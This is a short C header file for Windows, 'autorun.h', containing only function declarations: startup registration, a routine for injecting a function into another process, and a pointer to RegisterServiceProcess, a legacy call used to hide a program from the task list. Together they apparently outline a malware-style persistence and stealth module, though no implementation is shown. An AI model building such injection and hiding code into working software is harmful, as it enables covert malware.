#ifndef AUTORUN_H
#define AUTORUN_H

#include <windows.h>

void RegisterProgram();
DWORD WINAPI func(LPVOID);
BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID));

BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);

#endif